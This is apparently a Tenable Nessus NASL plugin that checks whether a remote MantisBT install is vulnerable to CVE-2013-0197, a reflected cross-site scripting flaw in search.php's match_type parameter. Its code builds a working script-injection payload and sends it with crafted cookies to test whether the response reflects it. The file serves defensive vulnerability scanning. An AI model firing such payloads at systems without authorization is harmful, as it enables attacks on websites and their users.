#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64490);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/05/16 14:02:53 $");

  script_cve_id("CVE-2013-0197");
  script_bugtraq_id(57456);
  script_osvdb_id(89345);

  script_name(english:"MantisBT search.php match_type Parameter XSS");
  script_summary(english:"Tries to inject script code via the match_type parameter");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of MantisBT installed on the remote host fails to properly
sanitize user-supplied input to the 'match_type' parameter of the
'search.php' script before using it to generate dynamic HTML output.  An
attacker may be able to leverage this to inject arbitrary HTML and
script code into a user's browser to be executed within the security
context of the affected site. 

Note that the install is also likely to be affected by additional
cross-site scripting vulnerabilities as well as an unauthorized status
update flaw, although Nessus has not tested for these additional
issues."
  );
  # http://hauntit.blogspot.de/2013/01/en-mantis-bug-tracker-1212-persistent.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?26660ed2");
  script_set_attribute(attribute:"see_also", value:"http://www.mantisbt.org/bugs/view.php?id=15373");
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to version 1.2.13 or later or apply the patch from the
referenced URL."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mantisbt:mantisbt");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("mantis_detect.nasl");
  script_require_keys("installed_sw/MantisBT");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

app_name = "MantisBT";

install = get_single_install(app_name: app_name, port: port);
install_url = build_url(port:port, qs:install['path']);
dir = install['path'];

xss_test = '"><script>alert(' + "'" + (SCRIPT_NAME - ".nasl") + '-' +
  unixtime() + "'" + ')</script>';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : '/search.php',
  qs       : 'sticky_issues=1&sortby=last_updated&dir=DESC&hide_status_id' +
             '=90&match_type=' + urlencode(str:xss_test),
  pass_str : 'name="match_type" value="' + xss_test,
  pass_re  : '>Match Type:',
  add_headers : make_array('Cookie', 'MANTIS_PROJECT_COOKIE=1; MANTIS_BUG_LIST_COOKIE=1'),
  follow_redirect : 1
);

if (!exploit)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, install_url);
